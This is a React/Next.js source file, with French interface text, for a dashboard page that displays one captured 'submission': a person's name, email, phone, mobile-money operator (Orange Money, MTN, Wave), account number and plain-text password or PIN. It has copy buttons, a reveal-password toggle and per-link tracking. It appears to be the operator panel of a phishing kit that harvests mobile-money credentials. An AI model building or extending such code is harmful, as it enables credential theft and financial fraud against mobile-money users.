'use client';

import { useState, useEffect } from 'react';
import {
    ArrowLeft,
    Trash2,
    CreditCard,
    Smartphone,
    Lock,
    Loader2,
    Mail,
    Phone,
    Shield
} from 'lucide-react';
import { cn, copyToClipboard, formatDate } from '@/lib/utils';
import Link from 'next/link';
import { useParams, useRouter } from 'next/navigation';
import { api } from '@/lib/api';

interface Submission {
    id: string;
    full_name: string;
    email: string;
    phone: string;
    method: string;
    account_number: string;
    password: string;
    bank_name: string;
    operator_name: string;
    created_at: string;
    status: string;
    link_id: string;
}

export default function SubmissionDetails() {
    const params = useParams();
    const router = useRouter();
    const [submission, setSubmission] = useState<Submission | null>(null);
    const [loading, setLoading] = useState(true);
    const [showSensitive, setShowSensitive] = useState(false);

    useEffect(() => {
        const fetchSubmission = async () => {
            try {
                const data = await api.get(`/submissions/${params.id}/`);
                setSubmission(data);
            } catch (error) {
                console.error('Error:', error);
            } finally {
                setLoading(false);
            }
        };

        if (params.id) fetchSubmission();
    }, [params.id]);

    const deleteSubmission = async () => {
        if (!confirm('Supprimer définitivement cette soumission ?')) return;
        try {
            await api.delete(`/submissions/${params.id}/`);
            router.push('/dashboard/submissions');
        } catch (error) {
            console.error('Error:', error);
        }
    };

    if (loading) return (
        <div className="flex items-center justify-center min-h-[400px]">
            <Loader2 className="w-10 h-10 text-brand-primary animate-spin" />
        </div>
    );

    if (!submission) return <div className="text-center py-20 opacity-40">Soumission non trouvée.</div>;

    return (
        <div className="space-y-10 animate-fade-in pb-20 max-w-5xl mx-auto">
            <div className="py-6 border-y border-white/5 bg-white/[0.01] flex items-center justify-center">
                <h2 className="text-[11px] font-black uppercase tracking-[5px] text-white">📋 DÉTAILS DE LA SOUMISSION #{submission.id.slice(0, 8)}</h2>
            </div>

            <Link href="/dashboard/submissions" className="inline-flex items-center gap-2 text-[10px] font-black uppercase tracking-widest text-brand-text-dim hover:text-brand-primary transition-colors">
                <ArrowLeft className="w-3 h-3" /> [ Retour à la liste ]
            </Link>

            <div className="space-y-8">
                {/* Same UI as before, just updated data fetch */}
                <section className="glass-card rounded-2xl border-white/5 overflow-hidden">
                    <div className="px-8 py-4 bg-white/[0.02] border-b border-white/5 text-[9px] font-black uppercase tracking-[2px] opacity-40">📅 CONTEXTE DE RÉCEPTION</div>
                    <div className="p-8 grid grid-cols-1 md:grid-cols-2 gap-y-6 gap-x-12 text-sm">
                        <div className="flex justify-between border-b border-white/5 pb-2">
                            <span className="opacity-40 uppercase font-bold text-[10px]">Date exacte</span>
                            <span className="font-medium">: {formatDate(submission.created_at, 'long')}</span>
                        </div>
                        <div className="flex justify-between border-b border-white/5 pb-2">
                            <span className="opacity-40 uppercase font-bold text-[10px]">Lien source ID</span>
                            <span className="font-bold text-brand-primary">: {submission.link_id || 'Direct'}</span>
                        </div>
                    </div>
                </section>

                <section className="glass-card rounded-2xl border-white/5 overflow-hidden">
                    <div className="px-8 py-4 bg-white/[0.02] border-b border-white/5 text-[9px] font-black uppercase tracking-[2px] opacity-40">👤 IDENTITÉ DU CLIENT</div>
                    <div className="p-8 space-y-6">
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-white/5 pb-4 gap-4">
                            <div>
                                <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">Nom complet enregistré</p>
                                <p className="text-xl font-bold text-white">{submission.full_name}</p>
                            </div>
                        </div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                            <div>
                                <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">E-mail</p>
                                <p className="font-bold">{submission.email}</p>
                            </div>
                            <div>
                                <p className="opacity-40 text-[10px] font-black uppercase tracking-widest mb-1">Téléphone Direct</p>
                                <p className="font-bold">{submission.phone}</p>
                            </div>
                        </div>
                    </div>
                </section>

                <section className={cn(
                    "glass-card rounded-[32px] overflow-hidden shadow-[0_0_50px_rgba(249,115,22,0.1)]",
                    submission.method === 'orange' ? "border-orange-500/30 bg-orange-500/[0.02]" :
                        submission.method === 'mtn' ? "border-yellow-500/30 bg-yellow-500/[0.02]" :
                            submission.method === 'wave' ? "border-blue-500/30 bg-blue-500/[0.02]" :
                                "border-white/5"
                )}>
                    <div className={cn(
                        "px-8 py-5 border-b flex justify-between items-center",
                        submission.method === 'orange' ? "bg-orange-500/10 border-orange-500/20 text-orange-400" :
                            submission.method === 'mtn' ? "bg-yellow-500/10 border-yellow-500/20 text-yellow-500" :
                                submission.method === 'wave' ? "bg-blue-500/10 border-blue-500/20 text-blue-400" :
                                    "bg-white/5 border-white/10"
                    )}>
                        <div className="text-[11px] font-black uppercase tracking-[3px] flex items-center gap-3">
                            <CreditCard className="w-5 h-5" /> COORDONNÉES DE LIAISON DE COMPTE
                        </div>
                    </div>

                    <div className="p-8 sm:p-12 space-y-12">
                        <div className="flex items-center gap-4">
                            <span className="opacity-40 text-[10px] font-black uppercase tracking-widest">Opérateur détecté :</span>
                            <span className={cn(
                                "font-black text-2xl uppercase italic",
                                submission.method === 'orange' ? "text-orange-500" :
                                    submission.method === 'mtn' ? "text-yellow-500" :
                                        submission.method === 'wave' ? "text-blue-400" :
                                            "text-white"
                            )}>
                                {submission.method === 'orange' ? '🟠 Orange Money' :
                                    submission.method === 'mtn' ? '🟡 MTN Mobile Money' :
                                        submission.method === 'wave' ? '🌊 Wave Mobile' :
                                            submission.method} {submission.bank_name ? '(' + submission.bank_name + ')' : ''}
                            </span>
                        </div>

                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                            <div className="space-y-4">
                                <div className="flex justify-between items-center">
                                    <p className="text-[10px] font-black uppercase tracking-[3px] text-brand-text-dim">Numéro de Compte / Tel</p>
                                    <button onClick={() => copyToClipboard(submission.account_number)} className="text-[9px] font-black text-brand-primary">[ COPIER ]</button>
                                </div>
                                <div className="relative p-6 bg-[#03040b] border border-white/10 rounded-2xl font-mono text-2xl tracking-[5px] text-white flex justify-between items-center">
                                    <span>{submission.account_number}</span>
                                    <Smartphone className="w-6 h-6 opacity-20" />
                                </div>
                            </div>

                            <div className="space-y-4">
                                <div className="flex justify-between items-center">
                                    <p className="text-[10px] font-black uppercase tracking-[3px] text-orange-400">Mot de passe / Code PIN</p>
                                    <button onClick={() => copyToClipboard(submission.password)} className="text-[9px] font-black text-brand-primary">[ COPIER ]</button>
                                </div>
                                <div className="relative group">
                                    <div className={cn(
                                        "relative p-6 bg-[#03040b] border border-orange-500/20 rounded-2xl font-mono text-2xl tracking-[5px] text-orange-400 flex justify-between items-center transition-all duration-700 shadow-inner",
                                        !showSensitive && "blur-xl select-none"
                                    )}>
                                        <span>{showSensitive ? submission.password : "••••••••••••"}</span>
                                        <Lock className="w-6 h-6 opacity-20" />
                                    </div>
                                    {!showSensitive && (
                                        <button
                                            onClick={() => setShowSensitive(true)}
                                            className="absolute inset-0 flex items-center justify-center bg-black/40 backdrop-blur-md rounded-2xl text-[10px] font-black uppercase tracking-[4px] text-white opacity-0 group-hover:opacity-100 transition-opacity"
                                        >
                                            [ RÉVÉLER LE MOT DE PASSE ]
                                        </button>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                <div className="flex flex-wrap gap-4 pt-10 border-t border-white/5">
                    <button
                        onClick={deleteSubmission}
                        className="flex-1 py-5 px-6 rounded-2xl bg-red-400/5 border border-red-400/20 text-red-500 hover:bg-red-500 hover:text-white transition-all text-[11px] font-black uppercase tracking-widest"
                    >
                        [ 🗑️ Supprimer définitivement cette soumission ]
                    </button>
                </div>
            </div>
        </div>
    );
}
